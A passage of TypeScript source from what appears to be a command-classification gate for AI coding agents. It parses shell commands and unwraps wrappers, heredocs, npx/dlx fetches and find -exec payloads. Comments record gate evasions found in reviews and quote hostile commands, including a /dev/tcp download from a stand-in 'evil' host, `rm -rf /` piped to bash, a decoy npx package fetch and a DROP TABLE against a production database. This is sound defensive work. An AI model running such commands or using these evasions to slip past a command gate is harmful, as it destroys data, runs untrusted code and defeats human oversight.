        i = j;
        continue;
      }
      out.push(text.slice(i + 2, j));
      i = j;
      continue;
    }
    if (ch === '$' && text[i + 1] === '(') {
      let depth = 0;
      let j = i + 1;
      for (; j < text.length; j++) {
        if (text[j] === '(') depth++;
        else if (text[j] === ')' && --depth === 0) break;
      }
      out.push(text.slice(i + 2, j));
      i = j;
      continue;
    }
    if (ch === '`') {
      const end = text.indexOf('`', i + 1);
      if (end > i) {
        out.push(text.slice(i + 1, end));
        i = end;
      }
    }
  }
  return out;
}

/** Heads that take their SCRIPT from standard input when nothing else names one. */
const STDIN_SCRIPT_HEAD_RE = /^((?:ba|z|da|k|a)?sh|fish|python|python2|python3|ruby|perl|node|nodejs|php|Rscript)$/;
/** Stages that copy standard input to standard output unchanged. `tee` also writes files — those are classified
 *  on the segment itself; what matters here is that what comes OUT is what went IN. `head`/`tail` truncate and are
 *  deliberately absent: the literal that survives them is not the literal that went in. */
const PASS_THROUGH_RE = /^(?:cat|tee(?:\s+(?:-[aip]+|[^-\s]\S*))*)\s*$/;
/** Heads that RUN a file they are given: the interpreters, plus `source` and `.`, which run it in the CURRENT
 *  shell. `. <(echo CMD)` is the same execution edge as `bash <(echo CMD)` and was missed because the gate listed
 *  only the interpreters (exit review 6). */
const RUNS_A_FILE_RE = /^((?:ba|z|da|k|a)?sh|fish|python|python2|python3|ruby|perl|node|nodejs|php|Rscript|source|\.)$/;
/** the file names that mean "standard input" */
const STDIN_FILE_RE = /^(?:\/dev\/stdin|\/dev\/fd\/0|\/proc\/self\/fd\/0)$/;
/** heads whose operand is a script run in the CURRENT shell */
/** options that name the script INLINE or as a module: stdin is then data, not the program */
const INLINE_SCRIPT_FLAG_RE = /^(-c|-e|-E|--eval|--command|-m|--module|-p|--print|-r|--require|-i)$/;
/** options of those heads that consume the next token, so their value is not mistaken for a script operand.
 *  `bash -o pipefail -c CMD` and `bash -O extglob -c CMD` read `pipefail`/`extglob` as the program and lost the
 *  inline script entirely (exit review 6). */
const STDIN_HEAD_VALUE_FLAG_RE = /^([-+][a-zA-Z]*[oO]|--rcfile|--init-file|-X|-W|-Q|--conf|--check-prefix)$/;

/** True when this command runs whatever is fed to its standard input: `sh`, `bash -s`, `python3 -`, `node`.
 *  A script operand, or an inline `-c`/`-e`/`-m` program, means stdin is DATA and this is false. */
export function readsScriptFromStdin(segment: string): boolean {
  const tokens = tokenize(segment);
  const raw = tokens[0] ?? '';
  const head = raw.slice(raw.lastIndexOf('/') + 1);
  // `source FILE` / `. FILE` runs FILE in the CURRENT shell, and /dev/stdin names the pipe: `echo CMD | . /dev/stdin`
  // really executes CMD (exit review 5).
  if (head === 'source' || head === '.') return tokens.slice(1).some((t) => STDIN_FILE_RE.test(t));
  if (!STDIN_SCRIPT_HEAD_RE.test(head)) return false;
  const shellFamily = /^(?:ba|z|da|k|a)?sh$/.test(head);
  const rest = tokens.slice(1);
  for (let i = 0; i < rest.length; i++) {
    const t = rest[i]!;
    // A REDIRECTION IS NOT AN OPERAND. `bash 2>&1` and `bash > log` still read their program from stdin, and
    // reading the redirection as the script name answered false for both (exit review 4). An INPUT redirection is
    // the opposite: it REPLACES stdin, so the pipe edge is genuinely gone.
    // A HEREDOC OR HERESTRING IS THE STDIN SCRIPT ITSELF — `bash <<EOF` runs the body. A redirection from a FILE
    // is the opposite: it replaces stdin, so a pipe into it carries nothing and the file is the program.
    if (/^\d*<<-?/.test(t) || /^\d*<<</.test(t)) return true;
    // `<&0` DUPLICATES the descriptor stdin already has; only a redirection from a FILE replaces it, and reading
    // the duplication as a replacement dropped the pipe edge (exit review 6).
    if (/^\d*<&/.test(t)) continue;
    if (/^\d*</.test(t)) return false;
    if (/^(?:\d*(?:>>?|>&|>\|)|&>>?)/.test(t)) {
      if (/^(?:\d*(?:>>?|>&|>\|)|&>>?)$/.test(t)) i++; // a bare operator takes the next token as its target
      continue;
    }
    if (t === '-' || STDIN_FILE_RE.test(t)) return true; // explicitly THE stdin script
    // `-s` means "the script is on stdin" for the sh family only; for python and perl it is a different flag
    if (shellFamily && /^-[a-zA-Z]*s$/.test(t)) return true;
    // THE INLINE-SCRIPT FLAGS ARE NOT THE SAME FOR EVERY HEAD. For a shell only `-c` names a program; `-e`, `-E`,
    // `-i`, `-p`, `-r` and `-m` are ordinary shell options, and reading them as "an inline script" meant
    // `echo 'rm -rf /' | bash -e` lost the pipe edge entirely (exit review 5).
    if (
      (shellFamily ? /^-[a-zA-Z]*c$/.test(t) : INLINE_SCRIPT_FLAG_RE.test(t)) ||
      /^--(eval|command|module|print|require)=/.test(t)
    )
      return false;
    if (STDIN_HEAD_VALUE_FLAG_RE.test(t) || /^[-+][a-zA-Z]*[oO]$/.test(t)) {
      i++; // its value, never a script — `bash -euo pipefail` is not a script named pipefail
      continue;
    }
    if (t.startsWith('-') || t === '--') continue;
    return false; // a positional operand: THAT is the script
  }
  return true;
}

/** The exact text a command writes to standard output, or null when EGO cannot know it. Only a literal counts:
 *  an unquoted or double-quoted word carrying `$` or a backtick expands to something unknown, and guessing there
 *  would be the unearned positive claim this kernel exists to refuse. */
export function literalStdout(segment: string, heredoc?: { body: string; expanded: boolean }): string | null {
  // a heredoc BODY is the opener's standard output: verbatim when the delimiter was quoted, and — by the same
  // rule as any other word — only when nothing in it expands if the delimiter was not
  if (heredoc) return heredoc.expanded && /[$`]/.test(heredoc.body) ? null : heredoc.body;
  const trimmed = emitterTail(segment).replace(/^(?:\S*\/)(echo|printf|cat)(?=\s|$)/, '$1');
  const here = /^cat\s+<<<\s*(.+)$/.exec(trimmed);
  if (here) return literalWord(here[1]!.trim());
  const printf = /^printf\s+(?:--\s+)?([\s\S]+)$/.exec(trimmed);
  if (printf) {
    const words = splitWords(printf[1]!);
    const format = literalWord(words[0] ?? '');
    if (format === null) return null;
    // with no arguments the FORMAT is the output, provided it carries no conversion and no escape but `\n`
    if (words.length === 1) return /%/.test(format) ? null : decodeEscapes(format);
    if (!/^%[sb](\\n)?$/.test(format)) return null; // a multi-conversion format is not a literal
    const parts: string[] = [];
    for (const w of words.slice(1)) {
      const lit = literalWord(w);
      if (lit === null) return null;
      parts.push(lit);
    }
    // the format's own escapes are real: `printf '%s\\n' a b` writes two LINES, not one word
    return parts.map((v) => decodeEscapes(format.replace(/%[sb]/, () => v))).join('');
  }
  const echo = /^echo\b((?:\s+-[neE]+)*)\s+([\s\S]+)$/.exec(trimmed);
  if (!echo) return null;
  const parts: string[] = [];
  for (const word of splitWords(echo[2]!)) {
    const lit = literalWord(word);
    if (lit === null) return null;
    parts.push(lit);
  }
  if (!parts.length) return null;
  const joined = parts.join(' ');
  // `-e` turns the backslash escapes ON, and `-E` off; without either, /bin/sh's echo interprets them and bash's
  // does not. Decoding whenever a backslash is present is the FAIL-SAFE reading: it can only reveal more commands.
  return /-[neE]*e/.test(echo[1] ?? '') || (!/-[neE]*E/.test(echo[1] ?? '') && /\\/.test(joined))
    ? decodeEscapes(joined)
    : joined;
}

/** The command inside a stage, with the shell keywords, leading assignments and transparent wrappers sliced off
 *  VERBATIM. The normalizer would do more — but it also DE-QUOTES, and after that `'$X'` and `"$X"` read alike
 *  although only the first is a literal, so the upstream of a pipe is trimmed rather than normalized. */
export function emitterTail(text: string): string {
  let out = text.trim();
  for (;;) {
    const before = out;
    out = out.replace(/^(?:if|then|else|elif|while|until|do|!|time|coproc)\s+/, '');
    out = out.replace(/^[A-Za-z_][A-Za-z0-9_]*=(?:"[^"]*"|'[^']*'|\S*)\s+/, '');
    out = out.replace(/^(?:command|builtin|exec|env|nohup|stdbuf\s+-\S+|nice(?:\s+-n\s+\S+)?|timeout\s+\S+)\s+/, '');
    if (out === before) return out;
  }
}

/** The bytes a backslash escape stands for. `echo -e 'a\\nrm -rf /'` writes TWO LINES, so reading the text back
 *  with the backslash intact glued two commands into one word and produced a POSITIVE claim that was wrong —
 *  worse than opacity, because it is asserted rather than admitted (exit review 5). */
function decodeEscapes(text: string): string {
  // the NUMERIC escapes too: `\x20`, `\0101` and `\u0041` are ordinary characters in `echo -e` and `printf %b`,
  // and leaving them encoded asserted a literal that was not the text the shell would receive (exit review 6)
  text = text
    .replace(/\\x([0-9a-fA-F]{1,2})/g, (_m, h: string) => String.fromCharCode(parseInt(h, 16) & 0xff))
    // `\0440` is `\0` + three octal digits = 288, which `printf %b` masks to a byte (32, a space); leaving it at
    // 288 produced a character no shell would see and split the word in the wrong place
    .replace(/\\0([0-7]{1,3})/g, (_m, o: string) => String.fromCharCode(parseInt(o, 8) & 0xff))
    .replace(/\\u([0-9a-fA-F]{4})/g, (_m, h: string) => String.fromCharCode(parseInt(h, 16)));
  return text.replace(/\\(n|t|r|a|b|f|v|e|\\)/g, (_m, c: string) =>
    c === 'n' ? '\n' : c === 't' ? '\t' : c === 'r' ? '\r' : c === 'f' ? '\f' : c === 'v' ? '\v' : c === 'b' ? '\b' : c === '\\' ? '\\' : '\x1b',
  );
}

/** A single word's literal value: single quotes are exact, double quotes and bare words only when inert. */
function literalWord(word: string): string | null {
  const single = /^'([^']*)'$/.exec(word);
  if (single) return single[1]!;
  const double = /^"([^"]*)"$/.exec(word);
  const body = double ? double[1]! : word;
  if (/[$`]/.test(body)) return null; // it expands: the real output is not this text
  return body;
}

/** Splits a word list on unquoted whitespace, keeping each word's quotes so `literalWord` can judge them. */
function splitWords(s: string): string[] {
  const out: string[] = [];
  let cur = '';
  let quote: string | null = null;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i]!;
    if (quote) {
      cur += ch;
      if (ch === quote) quote = null;
      continue;
    }
    if (ch === "'" || ch === '"') {
      quote = ch;
      cur += ch;
      continue;
    }
    if (/\s/.test(ch)) {
      if (cur) out.push(cur);
      cur = '';
      continue;
    }
    cur += ch;
  }
  if (cur) out.push(cur);
  return out;
}

/** The segment TEXTS of a command. Everything that only needs to know WHICH commands run keeps using this; the
 *  pipeline edges are for the analyzer, which is the one place that has to model how they connect. */
export function splitShellSegments(command: string): string[] {
  return splitShellPipeline(command).map((stage) => stage.text);
}

/** Strips leading env assignments and transparent wrappers; expands `bash -c '...'` and `xargs` into inner commands. */
/** The command string carried by `su`/`runuser`/`flock`, in every spelling that runs it: `-c CMD`, `--command CMD`,
 *  `--command=CMD`, `--session-command=CMD`. Returns null when the wrapper carries no inline command. */
function operandWrapperBody(tokens: string[], from: number): string | null {
  for (let i = from + 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    // `--comm=`, `--sess=` … : any unambiguous abbreviation, and the body may be GLUED to a short cluster
    if (/^--(com|ses|sess)/.test(t) && !t.includes('=')) return tokens[i + 1] ?? null;
    if (/^-[a-zA-Z]*c$/.test(t)) return tokens[i + 1] ?? null;
    const glued = /^-[a-zA-Z]*c([\s\S]+)$/.exec(t);
    if (glued && !t.startsWith('--')) return glued[1]!;
    const m = /^--(?:com|ses|sess)[a-z-]*=([\s\S]*)$/.exec(t);
    if (m) return m[1]!;
  }
  return null;
}

export function normalizeSegment(segment: string): string[] {
  let s = segment.trim();
  // `npx --package=<spec> -c "<benign>"` FETCHES and runs that package; the command after `-c` is a decoy, and
  // every layer below treats `npx` as transparent and `-c` as a carrier, so the acquisition vanished entirely.
  // A runner carrying `--package`/`-p` is NOT transparent: the head survives so the vocabulary can classify it.
  // ... and only when the flag is NPX'S OWN, i.e. before the first non-flag token. In `npx tsc -p .` the `-p`
  // is tsc's project flag, and treating it as npx's made every ordinary `npx tsc` opaque.
  // `npm exec` is `npx` and `bun x` is `bunx` — npm-exec(1) documents them as the SAME command. Stripping the
  // two-word spelling as a transparent pair sent it down a different path from the one-word spelling, so the npx
  // ACQUISITION guard below (a runner carrying its own `--package` fetches) never saw it (exit review 4).
  const WRAP = String.raw`(?:(?:[A-Za-z_][A-Za-z0-9_]*=(?:'[^']*'|"[^"]*"|\S*)|env|command|nohup|setsid|stdbuf|nice(?:\s+-n\s+\S+)?|ionice|timeout(?:\s+\S+)?|caffeinate|chronic|unbuffer|time|builtin|--)\s+)*`;
  // the two-word spellings are the SAME command as the one-word ones, and the rewrite must find them behind a
  // wrapper too — `env npm exec tsc` reached command.unknown while `npx tsc` was an ordinary build
  s = s.replace(new RegExp(`^(${WRAP})npm\\s+(?:exec|x)\\s+`), '$1npx ').replace(new RegExp(`^(${WRAP})bun\\s+x\\s+`), '$1bunx ');
  // THE ACQUISITION GUARD MUST SEE THE HEAD WHEREVER THE HEAD IS. It tested only the RAW head, so one transparent
  // wrapper hid it: `env npx --package=evil-thing -c "tsc --version"` fetched and ran an arbitrary package while
  // the kernel classified the decoy `tsc --version` as an ordinary build (exit review 7). The same shape as the
  // environment-prefix defect — a guard anchored at position 0 in a string the normalizer is about to rewrite.
  const acq = new RegExp(`^${WRAP}(npx|bunx)\\s`).exec(s);
  if (acq) {
    const t = tokenize(s.slice(s.indexOf(acq[1]!)));
    let k = 1;
    while (k < t.length && t[k]!.startsWith('-')) {
      if (/^(--package|-p)(=|$)/.test(t[k]!)) return [s];
      if (t[k] === '--package' || t[k] === '-p' || t[k] === '-c' || t[k] === '--call') k++;
      k++;
    }
  }
  const extra: string[] = [];
  // A REDIRECTION TO `/dev/tcp` OR `/dev/udp` IS A NETWORK CONNECTION, and it needs no network binary. Both
  // directions matter: `> /dev/tcp/h/p` sends whatever the command produces, and `< /dev/tcp/h/p` makes the
  // remote side the command's INPUT — `cat 0< /dev/tcp/evil/80 > payload.sh` fetches a file EGO never read.
  for (const nm of s.matchAll(/\/dev\/(tcp|udp)\/([^/\s'"]+)\/([^/\s'"]+)/g))
    extra.push(`${MARK}net-redirect ${nm[1]} ${nm[2]} ${nm[3]}`);
  // Assignments that SELECT THE TARGET of a database or Kubernetes client are not noise: stripping them made
  // `PGHOST=prod-db psql -c "DROP TABLE users"` read as the local socket (round 14). They are re-attached below so
  // the target resolver sees them, and are judged nowhere else.
  const targetEnv: string[] = [];
  // leading VAR=value assignments: stripped, except the ones that change what runs (surfaced as `env-inject VAR`)
  const stripAssignments = (): boolean => {
    let any = false;
    for (;;) {
      const m = /^([A-Za-z_][A-Za-z0-9_]*)=(?:'[^']*'|"[^"]*"|\S*)\s+/.exec(s);
      if (!m) return any;
      if (ENV_INJECT_RE.test(m[1]!) && envInjects(m[1]!, m[0]!)) extra.push(`${MARK}env-inject ${m[1]}`);
      if (TARGET_ENV_RE.test(m[1]!)) targetEnv.push(m[0].trim());
      s = s.slice(m[0].length);
      any = true;
    }
  };
  stripAssignments();
  // `exec -a NAME prog …` runs `prog` under the name NAME: strip the alias so the real head is classified
  s = s.replace(EXEC_ARGV0_RE, '');
  // ...and behind a wrapper too: `command exec -a cat ./deploy.sh` forges argv[0] just the same (exit review 8)
  s = s.replace(new RegExp(`^(${WRAP})exec\\s+(?:-[a-zA-Z]+\\s+)*-a\\s+\\S+\\s+`), '$1');
  // shell prefix keywords (`if git push`, `do npm test`, `then rm -rf x`) are normalization, not a safety
  // judgement: stripping them in the analyzer gives every producer AND the top level the same treatment.
  //
  // EACH REMOVAL EXPOSES A NEW HEAD, so this alternates with the assignment strip instead of running once after
  // it. `if DOCKER_CONTEXT=production docker exec …` had its assignment looked for while the head was still `if`,
  // so the engine was never re-attached and no matcher could match a segment that began with an assignment —
  // a shell on a production daemon at ASK (exit review 6, generated cross-product).
  for (;;) {
    const m = /^(\S+)\s+/.exec(s);
    if (m && PREFIX_KEYWORDS.has(m[1]!)) {
      s = s.slice(m[0].length).trim();
      continue;
    }
    if (!stripAssignments()) break;
  }
  // `dlx` MEANS DOWNLOAD AND EXECUTE. pnpm and yarn always fetch the package from the registry, so the code that
  // runs was never in the workspace and EGO never read a byte of it — stripping the runner made `pnpm dlx <x>`
  // exactly as authorised as `<x>` itself, and an inner command that is ALLOW on its own reached ALLOW through a
  // registry fetch (exit review 4). The acquisition is surfaced AND the inner command is still analysed, because
  // both are true. `pnpm exec`/`yarn exec` run a locally installed binary and stay transparent; `npx`, `npm exec`
  // and `bun x` PREFER a local binary, and gating them would gate `npx tsc`, which the npx `--package` guard
  // already decided against.
  const dlx = /^(pnpm|yarn)\s+dlx\s+([\s\S]+)$/.exec(s);
  if (dlx) return [...extra, `${MARK}registry-fetch ${dlx[1]} dlx`, ...splitShellSegments(dlx[2]!).flatMap(normalizeSegment)];
  // two-word runners, stripped before wrapper handling so `pnpm exec vitest run` is `vitest run` everywhere
  for (;;) {
    const pair = WRAPPER_PAIRS.find((p) => new RegExp(`^${p[0]}\\s+${p[1]}\\s+`).test(s));
    if (!pair) break;
    s = s.replace(new RegExp(`^${pair[0]}\\s+${pair[1]}\\s+`), '');
  }
  const tokens = tokenize(s);
  if (tokens.length === 0) return extra;
  // `command -v NAME` / `-V NAME` LOOKS THE NAME UP and prints where it is; it does not run it. Stripping
  // `command` as a transparent wrapper classified the idiom every script uses to test whether a tool exists as
  // RUNNING that tool, so `command -v node` asked (exit review 4).
  if (tokens[0] === 'command' && /^-[vV]$/.test(tokens[1] ?? '')) return [...extra, s];
  // ...and behind a wrapper too: `timeout 5 command -v node` is the same lookup, and it was classified as RUNNING
  // node (exit review 7)
  {
    const cv = new RegExp(`^${WRAP}command\\s+-[vV]\\s`).exec(s);
    if (cv) return [...extra, s.slice(cv[0].length - 'command -v '.length)];
  }
  let idx = 0;
  for (;;) {
    const t = tokens[idx];
    if (t === undefined) break;
    if (WRAPPERS.has(t) || t === 'timeout') {
      idx++;
      const valueOpt = WRAPPER_VALUE_OPTS[t];
      const positional = WRAPPER_POSITIONALS[t];
      while (idx < tokens.length) {
        const tok = tokens[idx]!;
        if (tok === '--') {
          idx++;
          // after `env --` assignments may still follow: they are judged, then the command starts
          if (t === 'env')
            while (idx < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[idx]!)) {
              const name = tokens[idx]!.slice(0, tokens[idx]!.indexOf('='));
              // ...through `env --` too: a value that cannot name a program does not change what runs
              if (ENV_INJECT_RE.test(name) && envInjects(name, tokens[idx]!)) extra.push(`${MARK}env-inject ${name}`);
              if (TARGET_ENV_RE.test(name)) targetEnv.push(tokens[idx]!);
              idx++;
            }
          break;
        }
        if (t === 'env' && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tok)) {
          // assignments passed through `env` are judged exactly like leading assignments — INCLUDING the ones that
          // select the target, which this branch used to drop (round 15)
          const name = tok.slice(0, tok.indexOf('='));
          // ...and through `env NAME=value` as well, by the same test as a leading assignment
          if (ENV_INJECT_RE.test(name) && envInjects(name, tok)) extra.push(`${MARK}env-inject ${name}`);
          if (TARGET_ENV_RE.test(name)) targetEnv.push(tok);
          idx++;
          continue;
        }
        // `env -S '<command>'` / `--split-string=<command>` re-splits its argument into a command line and runs it,
        // exactly like `bash -c`: the whole string is the command, not an opaque option value
        if (t === 'env' && (tok === '-S' || tok === '--split-string' || tok.startsWith('-S') || tok.startsWith('--split-string='))) {
          const value = tok === '-S' || tok === '--split-string' ? (tokens[idx + 1] ?? '') : tok.startsWith('--split-string=') ? tok.slice('--split-string='.length) : tok.slice(2);
          // the split value is env's OWN argv: leading -u/-C/-i/-0 options and VAR=val assignments precede the command,
          // so re-parse it through the env wrapper again rather than treating its first token as the command head
          return [...extra, ...splitShellSegments('env ' + value).flatMap(normalizeSegment)];
        }
        if (tok.startsWith('-')) {
          idx++;
          if (valueOpt && valueOpt.test(tok) && !tok.includes('=')) idx++;
          continue;
        }
        if (positional && positional.test(tok)) {
          idx++;
          continue;
        }
        break;
      }
      continue;
    }
    if (WRAPPERS_WITH_OPERAND.has(t)) {
      // flock [opts] <file> cmd | flock [opts] <file> -c 'cmd', su [-] user -c cmd, su --command='cmd' user,
      // runuser -u user -- cmd
      const body = operandWrapperBody(tokens, idx);
      if (body !== null)
        return [...extra, ...splitShellSegments(body).flatMap(normalizeSegment), tokens.slice(idx).join(' ')];
      idx++;
      let sawSeparator = false;
      let userGiven = false;
      while (idx < tokens.length && tokens[idx]!.startsWith('-')) {
        const opt = tokens[idx]!;
        idx++;
        if (opt === '--') {
          sawSeparator = true;
          break;
        }
        if (/^(-u|--user)$/.test(opt)) {
          userGiven = true;
          idx++;
        } else if (/^(-w|--timeout|-E|--conflict-exit-code|-g|--group|-s|--shell)$/.test(opt)) idx++;
        else if (/^--user=/.test(opt)) userGiven = true;
      }
      // the lock file / user operand is only positional when it was not already given as an option and no `--`
      // separator has started the command line (round 13: `runuser -u root -- cp …` ate `cp` as the user name)
      if (
        !sawSeparator &&
        !userGiven &&
        (t === 'flock' ||
          t === 'su' ||
          (t === 'runuser' && tokens[idx] !== undefined && !tokens[idx]!.startsWith('-')))
      )
        idx++;
      continue;
    }
    break;
  }
  let rest = tokens.slice(idx);
  if (rest.length === 0) return extra;
  let head = rest[0]!;
  // an absolute path to a well-known tool (`/usr/bin/git`, `/opt/homebrew/bin/gh`) matches like the bare name;
  // relative paths (`./scripts/x.sh`, `./node_modules/.bin/gh`) are kept for effect analysis
  if (
    head.startsWith('/') &&
    /\/(git|gh|glab|kubectl|oc|helm|docker|podman|npm|npx|pnpm|yarn|bun|node|python3?|curl|wget|ssh|scp|rsync|sudo|claude|codex|terraform|aws|gcloud|az|vault|argocd|flux)$/.test(
      head,
    )
  ) {
    head = head.slice(head.lastIndexOf('/') + 1);
    rest = [head, ...rest.slice(1)];
  }
  // git long options may be abbreviated: expand them before any matcher or flag test looks at them
  if (head === 'git') {
    rest = expandGitAbbreviations(rest);
    // `-B` (checkout/switch) and `-M`/`-C` (branch) FORCE a ref to move, destroying commits, while `-b`/`-c`/`-m`
    // merely create or rename. Matchers are compiled case-insensitively, so the distinction cannot be expressed
    // there: it is decided here, case-sensitively, and surfaced as a marker the matcher can name (round 15).
    const verb = rest[1] ?? '';
    // checkout forces with -B, switch with -C, branch with -M (move) or -C (copy) — each the uppercase twin of a
    // harmless lowercase create/rename
    const forceLetters: Record<string, string> = { checkout: 'B', switch: 'C', branch: 'MC' };
    const letters = forceLetters[verb];
    const forced =
      letters !== undefined &&
      rest.some((t) => new RegExp(`^-[a-zA-Z]*[${letters}][a-zA-Z]*$`).test(t));
    if (forced) rest = [...rest, `${MARK}force-ref-reset`];
  }
  if (targetEnv.length && TARGET_ENV_HEADS.has(head)) rest = [...rest, ...targetEnv];
  const stripped = stripToolGlobalOptions(head, rest);
  rest = stripped.rest;
  extra.push(...stripped.extra);
  return [...extra, ...normalizeTail(rest)];
}

/** git accepts any UNAMBIGUOUS abbreviation of a long option, so `--no-verif`, `--forc`, `--amen` and `--de` all work.
 *  Every governance-relevant option is expanded to its canonical spelling before matching; accepting an abbreviation
 *  that git would reject as ambiguous is fail-closed, never fail-open. */
const GIT_LONG_OPTS = [
  '--no-verify', '--force', '--force-with-lease', '--delete', '--amend', '--upload-pack', '--receive-pack',
  '--exec', '--template', '--discard-changes', '--prune', '--mirror', '--tags', '--all', '--hard', '--no-edit',
  '--set-upstream', '--unset-upstream', '--move', '--copy', '--config-env', '--global', '--system', '--unset',
];
function expandGitAbbreviations(tokens: string[]): string[] {
  return tokens.map((t) => {
    const m = /^(--[a-z][a-z-]*)(=.*)?$/s.exec(t);
    if (!m) return t;
    const [, name, value = ''] = m;
    if (GIT_LONG_OPTS.includes(name!) || GIT_COMPLETE_LONG.has(name!)) return t;
    const hits = GIT_LONG_OPTS.filter((o) => o.startsWith(name!));
    // `--de` prefixes both --delete and --discard-changes: expanding to the FIRST governed match keeps the deny,
    // which is the safe direction. git itself would refuse the ambiguity, so nothing legitimate is lost.
    return hits.length ? hits[0]! + value : t;
  });
}

/** Rejoins argv tokens into a command string, re-quoting any token that carries whitespace or a shell operator, so a
 *  carried `sh -c "git push"` keeps its body as one token when the payload is re-tokenized. */
function requote(tokens: string[]): string {
  return tokens.map((t) => (/[\s;&|<>$`"']/.test(t) ? `'${t.replace(/'/g, `'\\''`)}'` : t)).join(' ');
}

/** `find … -exec CMD {} \;` / `-execdir` / `-ok` / `-okdir` / `fd -x|--exec CMD` / `-delete`: the payload runs, so it is classified. */
function findPayloads(rest: string[]): string[] {
  const out: string[] = [];
  const head = rest[0];
  if (head === 'find' || head === 'gfind') {
    const searchRoot = rest.slice(1).find((t) => !t.startsWith('-')) ?? '.';
    for (let i = 1; i < rest.length; i++) {
      const t = rest[i]!;
      if (t === '-exec' || t === '-execdir' || t === '-ok' || t === '-okdir') {
        const cmd: string[] = [];
        let j = i + 1;
        while (j < rest.length && rest[j] !== ';' && rest[j] !== '\\;' && rest[j] !== '+')
          cmd.push(rest[j++]!);
        // `{}` stands for a match under the search root: the root is the most specific path the kernel can see
        if (cmd.length) out.push(requote(cmd.map((c) => (c === '{}' ? searchRoot : c))));
        i = j;
      } else if (t === '-delete') {
        // predicates narrow a deletion: only a search root that is itself a protected tree is judged as deleting it
        out.push(
          /(^|\/)\.(harness|git|husky|claude|codex|ssh|aws|kube|gnupg)(\/|$)/i.test(searchRoot)
            ? `rm -r ${searchRoot}`
            : `rm -r ${searchRoot.replace(/\/$/, '')}/FIND_MATCH`,
        );
      }
    }
  }
  if (head === 'fd' || head === 'fdfind') {
    // `fd [OPTIONS] [pattern] [path]`: the search root is the second bare operand, else the working directory
    const execAt = rest.findIndex((t) => t === '-x' || t === '--exec' || t === '-X' || t === '--exec-batch');
    const operands = rest.slice(1, execAt < 0 ? rest.length : execAt).filter((t) => !t.startsWith('-'));
    const searchRoot = operands[1] ?? '.';
    for (let i = 1; i < rest.length; i++) {
      const t = rest[i]!;
      if (t === '-x' || t === '--exec' || t === '-X' || t === '--exec-batch') {
        const cmd: string[] = [];
        let j = i + 1;
        while (j < rest.length && rest[j] !== ';' && rest[j] !== '\\;') cmd.push(rest[j++]!);
        // `{}` / `{/}` / `{.}` stand for a match under the search root, exactly as find's `{}` does: substitute the
        // root rather than dropping the placeholder, or `fd -x rm -rf {}` reads as a bare `rm -rf` (round 13)
        if (cmd.length) out.push(requote(cmd.map((c) => (/^\{.*\}$/.test(c) ? searchRoot : c))));
        i = j;
      }
    }
  }
  if (head === 'parallel' || head === 'xargs') {
    const after: string[] = [];
    let replstr: string | null = null;
    for (let i = 1; i < rest.length; i++) {
      const t = rest[i]!;
      if (after.length === 0 && t.startsWith('-')) {
        // -I R / -J R / --replace=R: R is a placeholder, not the command; other value options consume their value
        const m = /^(-I|-J|--replace|-i)(?:=?(.+))?$/.exec(t);
        if (m) {
          if (m[2]) replstr = m[2];
          else if (m[1] === '-I' || m[1] === '-J') replstr = rest[++i] ?? null;
          else replstr = '{}';
          continue;
        }
        if (/^(-n|-L|-P|-s|-E|-d|-a|--max-args|--max-procs|--delimiter|--arg-file|-j|--jobs)$/.test(t)) i++;
        continue;
      }
      after.push(t);
    }
    const payload = after.filter((t) => t !== replstr && !/^\{.*\}$/.test(t) && t !== ':::');
    if (payload.length) out.push(requote(payload));
  }
  return out;
}

/** A system interpreter named by its absolute path is that interpreter. `/bin/sh -c 'git push origin main'` was
 *  read as a SCRIPT PATH to open, found unreadable, and asked — while the same command spelled `sh -c` is denied
 *  (exit review 4). Only the system directories count: a repository-local `./bin/sh` is a file EGO can read, and
 *  reading it is strictly better than assuming what it is. */
const SYSTEM_INTERPRETER_RE = /^\/(?:bin|sbin|usr\/bin|usr\/sbin|usr\/local\/bin)\/((?:ba|z|da|k|a)?sh|fish)$/;

function normalizeTail(rest: string[]): string[] {
  let head = rest[0]!;
  const systemInterpreter = SYSTEM_INTERPRETER_RE.exec(head);
  if (systemInterpreter) {
    head = systemInterpreter[1]!;
    rest = [head, ...rest.slice(1)];
  }
  if (head === 'bash' || head === 'sh' || head === 'zsh' || head === 'dash' || head === 'ksh' || head === 'fish') {
    // -c, or a combined short-flag cluster CONTAINING c (`-euc`, `-ec`, `-lc`, `-xc`, `-cx`) — `-c` takes the next
    // operand as the command string wherever it sits in the cluster. A `--` may separate it from that operand.
    // It must come BEFORE the first operand: in `bash run.sh -c ls` the `-c` is the SCRIPT'S argument, and reading
    // it as the shell's hijacked the interpreter so run.sh was never resolved at all (exit review 4).
    // AN OPTION'S VALUE IS NOT AN OPERAND. `bash -o pipefail -c CMD` has `pipefail` where the scan looked for the
    // script, so the `-c` after it was read as the SCRIPT'S argument and the inline program was never analysed
    // (exit review 6).
    const operandAt: number[] = [];
    for (let i = 1; i < rest.length; i++) {
      if (STDIN_HEAD_VALUE_FLAG_RE.test(rest[i]!)) {
        i++;
        continue;
      }
      if (!rest[i]!.startsWith('-')) operandAt.push(i);
    }
    const firstOperand = operandAt.length ? operandAt[0]! : -1;
    const cIdx = rest.findIndex((t) => t === '-c' || /^-[a-z]*c[a-z]*$/i.test(t));
    if (cIdx >= 0 && (firstOperand < 0 || cIdx < firstOperand)) {
      const inner = rest[cIdx + 1] === '--' ? rest[cIdx + 2] : rest[cIdx + 1];
      if (inner) return [`${head} -c`, ...splitShellSegments(inner).flatMap(normalizeSegment)];
    }
    // `sh <<< "git push origin main"` feeds the interpreter a script on stdin: the herestring IS the command, and
    // the same text after `-c` is denied (exit review 4).
    const hereIdx = rest.findIndex((t) => t === '<<<');
    if (hereIdx >= 0 && rest[hereIdx + 1])
      return [`${head} <<<`, ...splitShellSegments(unquoteShellWord(rest[hereIdx + 1]!)).flatMap(normalizeSegment)];
    // `bash < script.sh` RUNS script.sh — the redirection names the program exactly as an operand would, and
    // reading it as an unclassified option left a workspace script unanalysed (exit review 5).
    const fromFile = /(?:^|\s)<\s*([^\s<>|&;]+)/.exec(rest.join(' '));
    if (fromFile && !STDIN_FILE_RE.test(fromFile[1]!) && fromFile[1] !== '-') return [`${head} ${fromFile[1]}`];
  }
  // `trap 'CMD' EXIT` stores CMD and the shell runs it later: it is a carrier exactly like `sh -c`, and an
  // absolute core deny inside its quoted argument reached ASK (exit review 4).
  if (head === 'trap' && rest[1]) {
    const body = unquoteShellWord(rest[1]!);
